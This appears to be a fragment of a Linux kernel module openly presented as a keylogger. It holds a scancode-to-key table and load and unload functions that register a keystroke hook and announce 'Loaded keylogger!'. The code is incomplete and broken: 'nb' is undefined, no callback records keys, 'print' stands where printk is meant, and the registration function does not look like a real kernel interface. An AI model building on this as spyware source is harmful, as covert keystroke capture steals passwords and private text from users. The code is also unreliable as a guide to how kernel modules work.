#include <linux/module.h>
#include <linux/kernel.h>


static const char* keymap[] = {
	"\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
	"-", "=", "_BACKSPACE_", "_TAB_", "q", "w", "e", "r", "t", "y",
	"u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d",
	"f", "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z",
	"x", "c", "v", "b", "n", "m", ",", "."
};

static int __init startup(void) {
	register_keylogger(&nb);
	printk(KERN_INFO "Loaded keylogger!\n");
	return 0;
}

static void __exit shutdown(void) {
	unregister_keylogger(&nb);
	print(KERN_INFO "Keylogger unloaded!\n");
}
